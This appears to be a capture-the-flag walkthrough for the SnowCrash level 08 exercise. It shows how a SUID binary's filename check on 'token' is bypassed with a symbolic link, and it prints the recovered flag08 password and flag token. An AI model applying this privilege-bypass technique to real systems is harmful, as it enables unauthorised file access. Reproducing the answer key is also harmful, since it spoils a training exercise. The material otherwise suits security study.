# 🔐 Level 08

> **Category:** Symlink Bypass  
> **Difficulty:** ⭐⭐☆☆☆  
> **Key Technique:** Filename check bypass using symbolic links

---

## 📋 Overview

A SUID binary checks if the filename contains "token" before reading it. We bypass this restriction using symbolic links.

---

## 🔍 Reconnaissance

### Initial Discovery

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

### Testing the Binary

```bash
level08@SnowCrash:~$ ./level08 
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

level08@SnowCrash:~$ ./level08 "token asdjha as j"
You may not access 'token asdjha as j'
```

---

## 💡 Vulnerability Analysis

The binary checks if the **filename** contains the word "token" and blocks access if it does. However:

> [!NOTE]
> The check is performed on the **filename string**, not the actual file. A symbolic link with a different name pointing to `token` will bypass this check.

---

## 🎯 Exploitation

### Creating a Symlink with a Different Name

```bash
# Create symlink with an allowed name
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/myflag

# Read through the symlink
level08@SnowCrash:~$ ./level08 /tmp/myflag
quif5eloekouj29ke0vouxean
```

### Obtaining the Password

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

## ✅ Flag

| Item | Value |
|------|-------|
| flag08 Password | `quif5eloekouj29ke0vouxean` |
| Token | `25749xKZ8L7DkSCwJkT9dyv6f` |

---

## 📚 References

- [Symbolic Links - Linux](https://man7.org/linux/man-pages/man7/symlink.7.html)
- [TOCTOU Race Conditions](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)